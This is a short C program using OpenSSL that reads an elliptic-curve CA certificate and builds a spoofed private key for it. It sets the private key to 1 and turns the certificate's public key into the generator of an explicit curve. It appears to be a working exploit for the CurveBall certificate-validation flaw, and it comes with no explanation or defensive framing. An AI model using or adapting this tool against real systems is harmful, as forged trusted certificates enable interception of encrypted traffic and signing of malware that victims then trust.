#include <stdio.h>
#include <stdlib.h>
#include <argp.h>
#include <stdbool.h>
#include <openssl/ssl.h>

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        fprintf(stderr, "Missing argument 1: Missing certificate name\n");
        exit(EXIT_FAILURE);
    }

    FILE *f = fopen(argv[1], "r");
    if (f == NULL)
    {
        perror("Error reading certificate");
        exit(EXIT_FAILURE);
    }

    BIO *bio = BIO_new_fd(fileno(stdout), BIO_NOCLOSE);

    X509 *cert = PEM_read_X509(f, NULL, NULL, NULL);
    EVP_PKEY *publicKey = X509_get0_pubkey(cert);
    EC_KEY *ecKey = EVP_PKEY_get0_EC_KEY(publicKey);

    if (ecKey == NULL) {
        fprintf(stderr, "Key is not Elliptic curve type.\n");
        exit(EXIT_FAILURE);
    }

    // Spoofing the certificate

    // Set private key to 1
    BIGNUM *privateKey = BN_new();
    BN_hex2bn(&privateKey, "1");
    EC_KEY_set_private_key(ecKey, privateKey);
    
    // Set EC group generator and Explicit flag
    const EC_GROUP *group = EC_KEY_get0_group(ecKey);
    EC_GROUP *spoofedGroup = EC_GROUP_dup(group);
    EC_GROUP_set_generator(spoofedGroup, EC_KEY_get0_public_key(ecKey), EC_GROUP_get0_order(group), EC_GROUP_get0_cofactor(group));
    EC_GROUP_set_asn1_flag(spoofedGroup, OPENSSL_EC_EXPLICIT_CURVE);

    EC_KEY_set_group(ecKey, spoofedGroup);

    // This is the new CA private key    
    PEM_write_bio_ECPrivateKey(bio, ecKey, NULL, NULL, 0, NULL, NULL);
    
    BIO_flush(bio);
    BIO_free(bio);
    
    return 0;
}
